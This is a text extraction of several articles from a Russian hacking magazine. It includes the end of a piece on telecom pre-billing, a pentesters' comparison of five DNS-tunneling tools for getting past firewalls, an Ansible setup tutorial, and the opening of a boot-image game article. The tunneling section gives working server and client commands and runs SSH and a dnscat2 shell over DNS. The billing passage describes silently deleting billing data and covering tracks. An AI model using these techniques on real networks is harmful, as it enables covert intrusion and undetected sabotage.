сложность и время обра бот ки настолько увеличатся, что это будет совер‐
шенно неприемлемо и непригодно для работы биллинга.
   Зачастую время от использования услуги до отображения этого факта
в бил линге не дол жно превышать нескольких минут. Как правило, метадан‐
ные, которые нужны для обра ботки конкретной порции данных, хранятся в БД
(MySQL, Oracle, Solid). Входные и выходные данные практически всегда лежат
в директории конкретного потока‐коллектора. Поэтому доступ к ним может
иметь любой, кому он раз решен (например, root‐поль зователь).
   Сама конфигурация предбиллинга с набором правил, сведениях о дос‐
тупах к базам данных, FTP и про чему хра нится в зашифрованном виде в фай‐
ловой базе данных. Если неизвестен логин‐пароль для дос тупа в пред‐
биллинг, то выгрузить конфигурацию не так просто.
  Лю бое внесение изменений в логику обработки (правила) фиксируется
в лог‐файл конфигурации предбиллинга (кто, когда и что менял).
   Даже если внутри предбиллинга данные переда ются по цепочкам обра‐
ботчиков‐коллекторов нап рямую (минуя выгрузку в файл), данные все равно
временно хранятся в виде файла в директории обработчика, и при желании
к нему можно получить доступ.
   Данные, которые про ходят обработку на предбиллинге, обезличены: они
не содержат ФИО, адресов и пас портных данных. Поэтому даже если ты
получишь доступ к этой информации, то персональных данных абонента
отсюда не узнать. Зато можно поймать какую‐то инфу по конкретному
номеру, IP либо другому идентифика тору.
   Имея доступ к конфигурации предбиллин га, ты получаешь данные для дос‐
тупа ко всем смежным системам, с которыми он работает. Как правило, дос‐
туп к ним ограничен непос редственно с сервера, на котором работает пред‐
биллинг, но так бывает не всегда.
   Если ты доберешься до директорий, где хра нятся файловые данные обра‐
ботчиков, то смо жешь вносить изменения в эти файлы, которые ждут своей
отправки потребителям. Час то это самые обычные текстовые документы. Тог‐
да картина такая: предбиллинг данные принял и обработал, но в конечную
систему они не пришли — пропали в «черной дыре».
  И выяснить причину этих потерь будет сложно, так как потеря на только
часть данных. В любом случае эмулировать потерю будет невоз можно
при дальнейшем поиске причин. Можно пос мотреть данные на входе
и выходе, но понять, куда они делись, не получится. Злоумышленнику
при этом остается только замести следы в операционной системе.
ТРЮКИ
 ЛАЗЕЙКА
 ПОД ФАЙРВОЛОМ





    Михаил Фирстов                     Андрей Скуратов                      Сергей Мигалин





 ТЕСТИРУЕМ ПЯТЬ ПОПУЛЯРНЫХ СРЕДСТВ,
  КОТОРЫЕ ПРОБРАСЫВАЮТ ИНТЕРНЕТ
            ПО DNS





Когда доступ в сеть наглухо отрезан файрволом, а передать
данные нужно позарез, на помощь приходит техника DNS‐
туннелирования. Зап росы к DNS даже при самых строгих
настройках иногда все же про ходят, и это можно исполь‐
зовать, отвечая на них со сво его сервера, находящегося
по ту сторону. Связь будет крайне медленной, но этого хва‐
тит для проникновения в локальную сеть организации или,
например, для срочного выхода в интернет по платному Wi‐
Fi за границей. Давай посмотрим, какие утилиты помогут
тебе в этом деле и какие у каждой плюсы и минусы.


Об авто рах
Авторы этой статьи ‐ пентестеры из команды FBK CyberSecurity. Это часть
крупнейшей российской аудиторско‐консалтинговой группы ФБК (Финан‐
совые и бухгалтерские консультанты). Компания специализируется на услугах
в области практической информа ционной безопасности.





Среди того, чем занимается FBK CyberSecurity:
 • тестирование на проникновение;
 • форензика, рассле дова ние инцидентов;
 • комплаенс, аудит по требованиям PCI DSS и SWIFT;
 • аппаратная безопасность (банкоматы, IoT и так далее);
 • IT‐аудит и IT‐консалтинг;
 • аудит смарт‐контрактов и обеспечение ИБ при проведении ICO.

А еще ты, возможно, уже читал статьи в «Хакере», написанные одним из спе‐
циалистов FBK CS и соавтором это го материала.


Вот общая схе ма, которая иллюстрирует то, что мы будем делать. В целом
теория здесь тривиальная: даже если выхода наружу нет, запрашиваемые
URL нужно резол вить, поэто му служ бу DNS зачас тую не ограничивают
в работе. Это дает хоть и узкую, но рабочую лазейку.





Сейчас в интернете мож но найти множество утилит для экс плуатации этой
техники — каждая со своими фичами и багами. Мы выбрали для сравнитель‐
ного тестирования пять наиболее популярных.


DNSCAT2
dnscat2 — довольно популярная ути лита, разработанная Роном Боузом,
для создания командно‐контрольного канала (C&C) через протокол DNS.
Вклю чает в себя серверную часть, написанную на Ruby, а также клиент на C.
Под Windows существует версия клиента для PowerShell.
  Для кодирования данных dnscat2 использует представление в шес тнад‐
цатеричном виде. Данные переда ются пос ледовательно, то есть значение
AAAA аналогично A.AAA, AAA.A и так далее.
   Также протокол нечувствителен к регистру, то есть a1 и A1 — одно и то же.
Для использования утилиты нужно иметь подконтрольный сервер с доменом,
NS‐записи которого ссылаются на конкретную машину. Клиент может выб‐
рать, добавлять ли доменное имя или добавлять в сообщение тег dnscat.
для отправ ки данных.
  Сообщения представлены как <encoded  data>.<domain> или <tag>.<
encoded  data>. В случае если данные представлены иначе, передаются
через неподдерживаемый тип записей или домен неизвестен, сервер может
отбросить их либо перенап равить к вышес тоящему серверу DNS.
   Dnscat2 поддерживает основные типы записей DNS: TXT, MX, CNAME,
A и AAAA. Тип ответа соответс твует типу входящего запроса:
 • TXT‐ответ — шестнад цатеричные значения;
 • CNAME и MX кодируются так же, как и запрос: либо с префиксом тега,
   либо с помощью постфикса домена. Это необ ходимо, потому что про‐
  межуточные серверы DNS не будут перенаправлять трафик, если он
   не заканчивается соот ветству ющим доменным именем;
 • A и AAAA — аналогично. TXT, данные без добавления домена или тега.


Про токол работы dnscat2
Сеанс устанавливается клиентом, отправляющим серверу SYN‐пакет. Сервер
отвечает аналогичным пакетом. Клиент и сервер ведут общение через пакеты
MSG. Когда клиент реша ет, что соединение завершено, он отправляет
на сервер пакет FIN, на что сервер отвечает так же. Когда сервер решает, что
соединение завершено, он отвечает на MSG от клиента пакетом FIN, и сеанс
прекращается.
  Из особенностей можно отметить, что сервер dnscat2 может держать нес‐
колько сессий, а также поддерживает базовую криптографию (не гарантируя
при этом надежности).
  Более подробно озна комиться с про токолом и особенностями утилиты ты
при желании можешь на странице в репози тории раз работчика.


Запуск
Следуя инструкции с GitHub, соберем все, что нам нужно, и попробу ем запус‐
тить. Для начала на сервере будем отслеживать, что же происходит на 53‐м
порте. Для этого запустим следующую команду.



Теперь запустим сервер. В аргументах передаем только доменное имя, так
как случай с прямым указанием IP нам неин тересен.





Аналогично запускаем клиент и видим, что сес сия установлена. Отлично, вро‐
де работает!





На сервере наблюдаем следующее.





Отлично, давай вой дем в сессию.





Посмотрим, что утилита нам предос тавляет.





Здорово! Для проверки запустим shell.





Супер! Сессия с шеллом соз дана, хоть и получили не сообщение, а bad se‐
quence. Для выхода из сес сии жмем Ctrl‐Z и идем в сессию 2.
  Создадим файл и запишем в него текст, пос ле чего выведем содержимое
и удалим его.





После результата для ввода новой команды нуж но еще раз нажать Enter.
Не интерактивно, конечно, но не страшно.
   Это, конечно, все весело, но нам‐то нужно пробросить туннель. Давай
попробуем выгрузить к нам файл по SCP с какого‐нибудь сервера через кли‐
ент, заодно проверим усредненную ско рость. Пробрасываем туннель.



В сессии клиента мы указали, что надо слушать на стороне сервера
порт 9090 и от клиента перенаправлять на 178.128.34.53:22. Теперь запус‐
тим SCP. В tcpdump можно увидеть общение клиента с сервером.





В итоге получили среднюю скорость 0,8 Кбайт/с, фильмы в 4K, конечно,
не посмотришь, но проб росить трафик нам все же удалось.





Давай глянем, что там насчет загрузки.





Как видим, хоть скорость и была около 10 Кбайт/с, но по факту утилита про‐
работала долговато.
  Сейчас мы запускали клиент на Kali, пос мотрим, как он работает в Win‐
dows. Здесь все печально. При том же эксперименте клиент в конце концов
смог установить соединение, хоть на это и ушло несчетное количество
попыток.





Однако при попытке проб росить SCP клиент внезап но отваливался.





Мне даже не удалось замерить среднюю скорость канала. Клиент тес‐
тировал ся на Windows 7 и 10 с одинаковыми резуль татами.
   Глянем напоследок и на клиент для PowerShell. Для этого придется
перезапустить сер вер с парамет ром ‐‐no‐cache. В итоге там удалось запус‐
тить клиент и даже на какое‐то время подружить его с сервером.





Один раз получилось даже так.





Однако в большинстве случаев это приводило к ситуации на скриншотах
ниже.





Ито го
 • Легкая настрой ка
 • Большой набор функций
 • Поддержка несколь ких сес сий
 • Компилируемые клиенты
 • Нестабильная работа на Windows (если это вообще можно назвать
   работой)
 • Скорость загрузки ~0,6–0,8 Кбайт/с
 • Скорость выгрузки ~10 Кбайт/с, но со странной задержкой


IODINE
Iodine — утилита, разработанная Эриком Экманом. Она позволя ет проб‐
расывать трафик IPv4 через DNS с использованием виртуальных интерфей‐
сов. Состоит из компилиру емых сервера и клиента, написанных на C. Клиенты
Iodine запускаются только с правами root, но могут работать на раз ных архи‐
тектурах (ARM, IA64, x86, AMD64, SPARC64) многих ОС: Linux, FreeBSD, Open‐
BSD, NetBSD, macOS и Windows (с драйвером OpenVPN TAP32).


Установка на сервер
Чтобы установить Iodine на сервер, дос таточно выполнить команду


$ sudo apt‐get install libz‐dev && git clone https://github.com/
yarrick/iodine.git && cd Iodine && make && make install

А вот команда на запуск сервера:


$ sudo ./iodined ‐f ‐c ‐P secretpassword 172.17.0.1 oversec.ru





Запуск клиента
Для начала работы с клиентом нужно написать что‐то вроде


$ ./iodine ‐f ‐P secretpassword oversec.ru





Теперь на клиенте появился вир туальный интерфейс dns0, клиент получит IP‐
адрес. Можно обращаться на этот IP, и трафик пойдет через DNS.





Попробуем подключиться по SSH.


$ ssh root@172.17.6.2





Работает! Вот что показывает tcpdump на 53‐м порте сервера Iodine.





                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
           ЛАЗЕЙКА
    ПОД ФАЙРВОЛОМ
            ТЕСТИРУЕМ ПЯТЬ ПОПУЛЯРНЫХ СРЕДСТВ,
        КОТОРЫЕ ПРОБРАСЫВАЮТ ИНТЕРНЕТ ПО DNS




Iodine может самостоятельно выбирать наиболее быстрый из доступных
видов кодировок (Base128, Base64, Base32) и типов пакетов (NULL, TXT, MX,
CNAME и A), благодаря чему скорость получа ется высокой — около 10 Кбайт/
с при использовании SCP.
  Протестируем клиент для Windows. Для этого необходимо сначала уста‐
новить драйверы интерфейса TAP/TUN. Затем запускаем приложение, как и
в Linux, — с учетки администра тора.





Вроде бы интерфейс настроился, но при попытке передать данные — ничего.





В общем, попытки запус тить клиент Iodine в Windows не увенчались успехом.
  Протестируем скорость отправки и получения.





Как мы видим, скорость для DNS‐туннеля отличная: 9,8 Кбайт/с на отправку
и получение через SCP.


Ито го
 • Автоматический выбор кодировок и типов пакетов
 • Запуск только из‐под суперпользователя
 • Компилируемый клиент
 • Необходимость установки драйверов в Windows (а также сомнительная
   возможность работы с этой системой)
 • Скорость загрузки ~9,8 Кбайт/с
 • Скорость выгрузки ~9,8 Кбайт/с


DNS2TCP
dns2tcp — инструмент для ретрансляции TCP через DNS. Клиент и сервер —
компилируемые, сервер также доступен через APT. Особенность утилиты
в том, что она проб расыва ет трафик от клиента к серверу.


Запуск
Для начала настроим сервер. Первым делом отредактируем файл /etc/
dns2tcpd.conf.





Теперь запустим сам сервак командой


$ dns2tcpd ‐f /etc/dns2tcpd.conf

Окей, теперь идем к клиенту.




Здесь мы  указали,  что будем пробрасывать SSH  (также  есть режим
для SMTP), указали порт, куда будем стучаться, ну и сам домен. Давай скорее
скачаем файлик.



А заодно проверим и выгрузку.





Ито го
 • Компилируемые сервер и клиент
 • Работает в режиме проб роса сети «внутрь»
 • Средняя скорость загрузки ~5 Кбайт/с
 • Средняя скорость выгрузки ~13 Кбайт/с


HEYOKA
Heyoka — утилита, написанная на С, причем клиент и сервер — это один
и тот же исполняемый файл. Она соз дает двунаправленный туннель DNS.
По словам авторов, утилита работает на 60% быстрее, чем другие аналогич‐
ные инструменты (по состоянию на 2009 год). На сайте проекта есть готовый
исполняемый файл для Windows, а версия для Unix, размещенная на GitHub,
была сделана сторонним разработчиком.


Запуск
Прочитав описание и инструкции на сайте, поп робуем объ ездить этого ска‐
куна. Начнем с запуска сервера на машине с Windows 10.





Отлично, вроде работает. Теперь запус тим клиент.





Опаньки! Кажет ся, не работает, хотя запускали с правами администратора.
Что ж, соберем теперь тулзу для Unix. Ана логично запускаем сервер и тес‐
тируем клиент.





Ито го
Следуя инструкциям с сайта раз работчика, запус тить клиент не удалось, а без
пол‐литра в исходниках и протоколе не разберешь ся. Так как мы не пьем
на работе, предлагаем перейти к следующей тулзе.


OZYMANDNS
Довольно древний инстру мент для создания туннелей DNS через SSH,
написанный Дэном Каминским в далеком 2005 году.


Запуск
Для  начала  использования  нужно   установить   Perl  и  библиотеки
MIME::Base32 и Net::DNS и обновить менеджер пакетов.


$ sudo perl ‐MCPAN ‐e shell
cpan[1]> install CPAN
cpan[2]> reload cpan
cpan[3]> install MIME::Base32
cpan[3]> install Net::DNS

Качаем и распаковываем архив.


$ wget https://github.com/mubix/stuff/blob/master/stolen/ozyman
dns_src_0.1.tgz?raw=true
$ tar ‐xf ozymandns_src_0.1.tgz?raw=true

Если попробовать запустить скрипт сей час, то он, скорее все го, упадет
с ошибкой импорта. Фикс проблемы — удалить выделенный фрагмент
из файла nomde.pl.





Сервер запускается очень прос то:


$ perl ./nomed.pl ‐i 0.0.0.0 oversec.ru

Если возникают ошибки импорта, попробуй установить недостающие пакеты
через CPAN.





Запускаем клиент.


$ ssh ‐D 8080 ‐C ‐o ProxyCommand="perl droute.pl lol.oversec.ru"
oversec.ru





Видим ошибку: Perl недоволен адресами серверов DNS. Пробуем указать
свой.


$ ssh ‐D 8080 ‐C ‐o ProxyCommand="perl droute.pl ‐r 138.197.178.150
lol.oversec.ru" oversec.ru ‐v

Видим, что кушает сервер, но соединение не создалось.





Под впечатлением от статей и видео, где люди показывали, как у них прек‐
расно все работает, мы провели в воз не с OzymanDNS несколько дней, но так
и не смогли заставить эту тулзу передать хотя бы бит информации. Воз‐
можно, у кого‐то из читателей хва тит на это терпения, но есть ли смысл?
У того, кто смог соединиться через OzymanDNS, скорость была 17 Кбит/с
и работа была нестабильной, а если учесть скудный набор функций, то можно
смело переходить с этой утилиты на что‐то другое.


РЕЗУЛЬТАТЫ
Итак, мы рассмотрели наибо лее известные утилиты для создания туннелей
через DNS. Понятно, что это далеко не все решения и в интернете
при желании можно найти мас су альтернатив. Однако выбирать уже есть
из чего!


       1. dnscat2

      Входящая скорость, Кбайт/с: 0,7

      Исходящая скорость, Кбайт/с: 10

        +: Легкая настройка, широкий набор функций, поддержка
        нескольких сессий

          -: Компилируемые клиенты, нестабильная работа в Windows


       2. Iodine

      Входящая скорость, Кбайт/с: 9,8

      Исходящая скорость, Кбайт/с: 9,8

        +:  Автоматичес кий выбор кодировок и типов  пакетов,
        высокая скорость работы

          -: Запуск толь ко с пра вами суперпользователя, компилиру‐
       емый   клиент,  необ ходимость   установки  драйверов
        для Windows


       3. dns2tcp

      Входящая скорость, Кбайт/с: 5

      Исходящая скорость, Кбайт/с: 13

        +: Не найдено

          -: Компилируемый клиент, работа ет в режиме проброса
        сети «внутрь»


       4. Heyoka

      Входящая скорость, Кбайт/с: NaN

      Исходящая скорость, Кбайт/с: NaN

        +: Не найдено

          -: Сложности с запус ком


       5. OzymanDNS

      Входящая скорость, Кбайт/с: NaN

      Исходящая скорость, Кбайт/с: NaN

        +: Не найдено

          -: Сложности с запус ком



В результате наиболее распространенная проб лема — это необходимость
компилировать клиент и нес табильная работа в Windows. Есть ли какой‐то
выход?
  А вот об этом мы поговорим уже в дру гой раз. :‐)
ТРЮКИ

   КОЛОНКА
     ИЛЬИ РУСАНЕНА





                                        Илья Русанен
                                            Главный редактор ][,
                                        занимаюсь разработкой и
                                               безопасностью
                                                   rusanen@glc.ru





    ИСПОЛЬЗУЕМ ANSIBLE
     ДЛЯ РАЗВЕРТЫВАНИЯ
    СИСТЕМЫ И ПРОГРАММ





Ansible — инс трумент, о котором слышали, без сомнения,
все, но который используют чаще системные администра‐
торы. Для разработчика или ресерчера знакомство с Ansible
обычно начинается, когда приходится раскатывать собс‐
твенные серверы или сталкиваться с деплоем существу‐
ющей  конфигурации.  Одна ко  Ansible  может  оказаться
полезен и в повседневной жизни — поп робуем разобраться,
чем именно.


Для кого?
Цель этого материала — показать основные приемы работы с Ansible
для решения простой и понятной задачи. Рас сказать о промышленном
использовании Ansible для раз вертывания инфраструктуры в рамках этой
заметки, разуме ется, невоз можно. Но уверен, пос ле прочтения ты при дума‐
ешь, как подстроить этот замеча тельный инс трумент под свой workﬂow.
Или как минимум обратишь на него внимание, если раньше обходил сто‐
роной.



ЗАЧЕМ НУЖНА ОРКЕСТРАЦИЯ ЛОКАЛЬНОЙ МАШИНЫ?
Давай для начала определимся, зачем мы хотим управлять своим компьюте‐
ром с помощью оркес тра тора. Под оркестра цией твоего компьютера мы
будем понимать:
 • автоматическую установку программ;
 • размещение файлов конфигураций;
 • выполнение единовременных команд (вроде уста новки плагинов);
 • клонирование рабочих репозиториев;
 • настройку среды разработ ки

и так далее. В рамках этой статьи мы научимся автоматизировать действия,
которые нужно совершить от уста новки базовой системы до получе ния
готового к работе компьютера.
  Зачем это может потребовать ся? Нес мотря на то что большинс тво людей
годами не переустанавливают систему, при чин дисциплинированно держать
свои конфиги в порядке может быть мас са. Для себя я выделил следующие.


Воспро изво димость
Мне важно иметь возможность быстро поднять привычную рабочую сре ду
на новой машине. Ситуации бывают разные:
 • внезапно отказал диск;
 • появилась необ ходимость порабо тать на другом железе;
 • эксперименты с Линуксом породили необъяснимые глюки, а время под‐
  жимает.

В подобных случаях час то приходится рас катывать ОС с нуля, ставить весь
необходимый софт и, что самое неп риятное, мучительно вспоминать все
пляски с бубном, которые устра ивал при предыдущей настройке ОС. Поясню:
в моем случае это установка Arch Linux (сама по себе довольно муторная),
допиливание оконного менеджера i3, донастройка железа (вплоть до чувс‐
твительности BT‐мыши), стандартная ерунда вро де локалей, шрифтов, sys‐
temd‐юнитов и shell‐скриптов. И все это без учета установки и настройки
непосредственно рабочего софта.
  Ничего страшного в этой процедуре нет, но она занимает почти день.
При этом все равно что‐то забудешь и вспомнишь об этом, только когда
выяснится, что оно не работа ет, не настроено или не установлено.


Пред сказуемость
Очень полезно знать, что в системе установлено и как настроено. Когда кон‐
фиг перед глазами, быстрее понимаешь, почему ОС так работает (или
не работает).
   Если не представляешь четко, что, как и когда ты сконфигурировал в сис‐
теме (а в Linux невозможно запомнить все даже с опорой на ArchWiki), ты
вскоре обнаружишь, что также не понимаешь, почему эта программа сейчас
работает так, хотя раньше работа ла иначе. Воз можно, ты ставил какой‐то
плагин или что‐то исправлял в конфиге, но забыл?
  Имея под рукой полное описание всех нас троек в одном месте, ты с мень‐
шей вероятностью столкнешься с этими проблемами.


Дек ларативность и под держиваемость
Декларативный подход к конфигурирова нию (читай: описание, как должно
быть, а не что нужно сделать) значительно упрощает понимание нас троек.
Вносить необходимые изменения в них ста новится куда проще, а вот свои
костыли поддерживать в ито ге слож нее, чем стороннее, но проверенное
решение.





  Пример наив ного «инсталлятора» пакетов в одном из моих скриптов.
  И это только одна функция

Кстати, если ты тоже без ума от декларативного подхода к описанию ОС,
обрати внимание на дистрибутив NixOS.

Дру гие решения?
Разумеется, для быстрого развертывания можно приспособить и другие инс‐
трументы, например системы обра зов вро де эппловской Time Machine
или Norton Ghost. Можно подойти и более радикаль но: запускать софт в кон‐
тейнерах Docker или даже виртуалках в AppVM. Проблема в том, что сложно
их поддерживать, управлять ими и обновлять софт на регулярной основе.
Другими словами, они созданы для решения нес колько других задач и не так
бесшовно встраиваются в повседневную жизнь, если это не твоя работа 24/7.



КАК НАМ ПОМОЖЕТ ANSIBLE
Ansible — это система оркестрации. Она написа на на Python, присутствует
в популярных дистрибутивах и не требует клиента на целевых машинах. Инс‐
трумент активно развивается, под него сущес твует много плагинов. Он дос‐
таточно новый, но уже популярен наряду с Puppet и Chef.
  Для работы с Ansible достаточно передать скрипт (сценарий, конфиг)
с перечислением действий, который он должен выполнить на целевой
машине. Давай посмотрим, как писать эти конфиги.
   Конфиг Ansible называется playbook. Он описыва ется на языке YAML. Клю‐
чевой объект конфига — задача. Это массив (список) вложенных бло‐
ков‐задач, каждая из которых описывает одно действие. Задачи могут быть
атомарны, а могут, в свою очередь, содержать блок подзадач. И так далее,
выстраивая дерево подзадач. Примеры задач:
 • обновить систему;
 • установить пакет (или пакеты);
 • скопировать конфиг;
 • выполнить команду.

Задач может быть сколь ко угодно, и Ansible пройдет ся по всем и выпол нит
каждую по очереди. Пос мотри на пример прос того конфига — он описан
в одном файле (часть блоков свернута для наг лядности). Конечно, большие
боевые конфиги удоб но разделять на нес колько файлов и тегировать, но для
наших задач хватит и одной прос тыни. :)





  Пример простого конфига для раз вертывания локального рабоче го
  окружения. Обрати внимание на список задач

У каждой задачи есть свои параметры (например, спи сок пакетов, которые
нужно поставить, или пути к файлам, которые нужно скопировать). Подробнее
о том, как писать задачи различных типов, ниже.


ПРОБУЕМ ANSIBLE
Что нуж но для работы Ansible?
Linux, Python и в некото рых случаях SSH. Сра зу ого ворим термины:
 • master — машина, с которой мы осуществляем управление, другими сло‐
   вами — на которой мы запус каем Ansible со скриптом. Она выполняет
   команды на удаленной (целевой) машине;
 • target — машина, над которой мы выполняем задачи, другими сло‐
   вами — целевая машина, на которой по скрипту нужно развернуть
   рабочее окружение.

Строго говоря, в отличие от дру гих систем оркестрации, устанавливать Ansi‐
ble на целевом хосте не обязательно. Если у тебя есть еще один компьютер
(я проделывал это, например, с Raspberry Pi 3), Ansible нужно иметь именно
на нем.
  Но мы провернем трюк: используем одну машину и как target‐хост, и как
master‐хост. Поэтому просто уста новим Ansible через pip Install ansible.





  Только что установленный Arch Linux с Python и Ansible через pip. Больше
  ничего не нужно


Пе речисляем хосты и запускаем playbook
С этого момента догово римся, что мы не раз деляем master‐ и target‐машины,
все действия выполняем на одной машине. Для уда ленных хостов процедура
будет почти такая же.
  Перед запуском скрипта ука жи Ansible список хостов, над которы ми нужно
совершать операции. Обычно список по группам указывается в файле /etc/
ansible/hosts. Создай этот файл и напиши следующее:


[control]
localhost ansible_connection=local

Этими строками мы:
 • создали группу control;
 • определили в ней один хост c адресом localhost (можно указать любой
   доступный IP);
 • дополнительно для хос та localhost ука зали тип соединения local.

Здесь необходимо пояснение. Обычно при работе с удаленными хостами An‐
sible соединяется с ними по SSH и выполняет определенные в скрипте опе‐
рации. Однако, поскольку мы выполняем действия над «самим собой»,
было бы излишне поднимать sshd‐демон, чтобы законнектиться к самому
себе. Для таких случаев Ansible поз воляет указать допол нительный параметр
ansible_connection, который определит тип соеди нения. В нашем случае
это local.
  Попробуем пропин говать хос ты на отклик (в нашем слу чае единственный
хост):


$ ansible all ‐m ping
localhost | SUCCESS => {
    "changed": false,
    "ping": "pong"
}

Ответ по localhost — работает.


СОБИРАЕМ СВОЙ PLAYBOOK
Мы уже знаем, что по большей части playbook — это набор задач разной сте‐
пени вложенности. Теперь научимся писать эти задачи.
   Главное, что нужно усво ить, — для выполнения каждой задачи требуется
использовать модуль. Модуль — это actor, который может совершать дей‐
ствия определенного типа. К примеру:
 • устанавливать и обновлять пакеты;
 • создавать и удалять файлы;
 • клонировать репозитории;
 • пинговать хосты;
 • отправлять сооб щения в Slack.

Для каждой задачи переда ем модуль и набор параметров его запуска, нап‐
ример список пакетов для уста новки. Модулей очень много, с их пол ным
списком ты можешь ознакомиться здесь. А пока пройдемся по тем, которые
нам понадобятся.


1. Обновле ние системы и установка пакетов
Модули pacman, apt, brew и другие пакетные менеджеры для язы ков и систем.
  Для обновления системы и уста новки базовых пакетов программ напишем
пару тасков с использованием модуля pacman. Вот пример подобной задачи:


‐ name: full system upgrade
  become: yes
  pacman:
    update_cache: yes
    upgrade: yes
‐ name: install cli apps
  become: yes
  pacman:
    name:
      ‐ xterm
      ‐ tmux
      ‐ neovim
      ‐ ranger
      ‐ mutt
      ‐ rsync
    state: present

Здесь мы определили две задачи: в первой обновляем систему, во второй
передаем модулю pacman список пакетов, которые нужно установить, и инс‐
трукцией become сооб щаем, что надо поднять привилегии до суперполь‐
зователя.
   Кстати, мы можем также передать имя юзера, которым нужно стать
при выполнении этой команды, как мы сделали бы это при использовании su.
Например, таким образом можно поменять шелл для себя при установке zsh
в задаче с модулем command:


‐ name: install zsh
  become: yes
  block:
    ‐ pacman:
        name:
          ‐ ...
          ‐ zsh
    ‐ command: chsh ‐s /usr/bin/zsh
      become_user: user

Обрати внимание на блочный конфиг задачи  install zsh: это удобный (но
необязательный) способ записи для  группировки нескольких действий,
не требующих выноса в отдельные (под)задачи.
  Для установ ки из AUR можно использовать и yaourt (правда, сейчас его
уже подвинул новый yay). Поскольку устанавливать из AUR под рутом нельзя,
а мы определили повышение привилегий в корневой задаче, создадим
отдельного юзера aur_builder и будем перехо дить под него в задачах уста‐
новки из AUR:


‐ name: create aur_builder user
  become: yes
  block:
    ‐ user:
        name: aur_builder
        group: wheel
    ‐ lineinfile:
        path: /etc/sudoers.d/11‐install‐aur_builder
        line: 'aur_builder ALL=(ALL) NOPASSWD: /usr/bin/pacman'
        create: yes
        validate: 'visudo ‐cf %s'

Теперь при установке пакетов мы можем включить блок установки из AUR:


‐ aur: name=yaourt skip_installed=true
  become: yes
  become_user: aur_builder


2. Лин куем кон фиги
Модуль: ﬁle.
  Следующий шаг, который мне обычно нуж но сделать, — это создание
симлинков на файлы кон фигураций, которые лежат в хранилище дотфайлов.


‐ name: link configs
  file:
    src: /home/user/dev/arch/config/{{ item }}
    dest: /home/user/.config/{{ item }}
    state: link
  with_items:
    ‐ i3
    ‐ alacritty
    ‐ nvim
‐ name: link xorg, tmux configs
  file:
    src: /home/user/dev/arch/config/{{ item }}
    dest: /home/user/{{ item }}
    state: link
  with_items:
    ‐ .xinitrc
    ‐ .Xresources
    ‐ .tmux.conf

Что происходит: мы итеративно проходим по предос тавленному листу items
и для каждого выполняем действие модуля ﬁle (создание симлинка), подста‐
вив вместо плейсхол дера {{ item }} текущий элемент из спис ка with‐
_items.


3. Инте рак тивные саб таски для VIM
Модули: expect для выполнения задач со вво дом и git для работы с репози‐
ториями.
  Следующая задача — нас тройка VIM. Кло нируем менеджер пакетов, слин‐
куем основной конфиг .vimrc и выполним установку плагинов.


‐ name: config vim
  block:
    ‐ file:
        src: /home/user/dev/arch/config/{{ item }}
        dest: /home/user/{{ item }}
        state: link
      with_items:
        ‐ .vimrc
    ‐ file:
        path: /home/user/.vim/bundle
        state: directory
    ‐ git:
        repo: 'https://github.com/VundleVim/Vundle.vim.git'
        dest: /home/user/.vim/bundle/Vundle.vim
    ‐ expect:
        command: nvim +PluginInstall +qall
        timeout: 600
        responses:
          (?i)ENTER: ""

Модуль git, как несложно догадать ся, служит для клонирования из репози‐
тория. Полный список опций ты найдешь в документации.
  Модуль expect служит для запуска команды уста новки плагинов VIM. Пос‐
кольку процесс дол гий, я выставляю ему тайм‐аут timeout: 600, чтобы Ansi‐
ble не завершил работу с ошибкой, не дождавшись окончания установки.
Блок responses позволяет нам ответить вводом пустой строки (считай,
нажать ENTER) на приглашение интерактивного ввода, в котором содержится
слово ENTER. Именно это спрашивает Vundle при установке плагинов и тре‐
бует подтверждения.


4. Используем перемен ные
Иногда для выпол нения операции нам требуются данные пользовательского
ввода.  Это  может  быть  ввод  дополнитель ных  опций,  имен  пакетов
или каких‐то кре дов. Переменные могут быть заданы, а могут быть интерак‐
тивно введены поль зователем.
  Например, перед кло нированием при ватных репози ториев можно спро‐
сить имя пользователя и пароль. Конечно, правильнее использовать приват‐
ные ключи, но, если нужно easy‐to‐go решение, мы можем предложить ввести
значение некоторых переменных вручную. Вот каким образом:


vars_prompt:
‐ name: "githubuser"
  prompt: "Enter your github username"
  private: no
‐ name: "githubpassword"
  prompt: "Enter your github password"
  private: yes

Ввод переменных  будет  зап рошен перед началом выполнения  задач.
Переменные много где пригодятся, поэтому лучше о них знать.


        WWW

                     Подробнее  о  хранении  приватных  данных
                       для конфигов посмотри в разделе Using Vault
                               in playbooks в докумен тации.



5. Теги — для partial-запуска
Иногда при отладке конфигов Ansible приходится многократно запус кать
задачи для про верки корректности их выполнения. При повторном запус ке
Ansible проверит, были ли уже выполнены эти задачи, и в большинстве слу‐
чаев не будет повторно совершать те же действия. Несмотря на это, удобнее
тегировать все задачи, чтобы иметь возможность запустить только их. Сде‐
лать это очень просто:


‐ name: install vmware
  become: yes
  block:
    ‐ pacman:
        name:
          ‐ fuse2
          ‐ gtkmm
          ‐ linux‐headers
          ‐ libcanberra
          ‐ pcsclite
          — ...
        state: present
    ‐ aur:
        name:
          ‐ ncurses5‐compat‐libs
        skip_installed: yes
        skip_pgp_check: yes
      become_user: aur_builder
  tags:
     ‐ vmware

Затем запустим только те, которые тегированы как vmware. Можно переда‐
вать как один тег, так и нес колько:


ansible‐playbook ‐‐tags=vmware playbook.yml

Запустим наш плейбук командой


ansible‐playbook ‐‐ask‐become‐pass playbook.yml

и через некоторое время нас ладимся выводом.





                Ansible выполнил задачи, описанные в конфиге


ЗАКЛЮЧЕНИЕ
Разумеется, мы рассмотрели только базовые концепты работы с Ansible.
В интернете немало туториалов по этому замечательному инс трументу.
У него множество опций, обширная документация, а количес тво трюков
при работе с ним удивит даже бывало го админа со стажем. Но и всего лишь
прочтя это краткое интро, ты наверняка придумаешь способы, как Ansible
может пригодиться именно тебе.


        WWW

                   •Документация
                     •Плагины (модули)
                      •Узнать больше про YAML, если не сталкивался
ТРЮКИ


  ЗМЕЯ
           В «ТВИТТЕРЕ»

                 КАК ВРУЧНУЮ СДЕЛАТЬ
         ЗАГРУЗОЧНЫЙ ОБРАЗ С ИГРОЙ,
          КОТОРЫЙ УМЕСТИТСЯ В ТВИТ




В 1998  году люди  соревновались,  кто
напишет самую короткую игру для DOS.
Позже  этот  вид  соревнования  назвали
                                                                            Алок Менхраджани
                                                                                      Сотрудник отдела ИБ в«код‐гольфингом».  Я  решил  вернуться                                                                                 компании Square. Соавтор
